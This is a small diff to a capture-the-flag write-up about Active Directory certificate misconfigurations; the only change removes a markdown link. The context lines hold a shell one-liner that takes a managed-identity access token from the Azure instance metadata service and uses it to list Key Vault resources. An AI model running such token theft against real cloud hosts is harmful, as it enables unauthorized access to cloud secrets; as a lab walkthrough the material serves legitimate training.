@@ -27,7 +27,7 @@ It looks like Alabaster's SSH account has a couple of tools installed which migh
 Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.
 
 ### Solution
-I went back as `alabaster` on the `ssh-server-vm` from [Certificate SSHenanigans]() and realized the reason for the `impacket` folder. I started poking around with Azure APIs a little more, discovering an Azure Key Vault resource:
+I went back as `alabaster` on the `ssh-server-vm` from `Certificate SSHenanigans` and realized the reason for the `impacket` folder. I started poking around with Azure APIs a little more, discovering an Azure Key Vault resource:
 ```bash
 alabaster@ssh-server-vm:~$ token=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq .access_token | tr -d '"') && curl -H "Authorization: Bearer $token" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2021-04-01
 {"value":[{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv","name":"northpole-it-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}},{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv","name":"northpole-ssh-certs-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}}]}
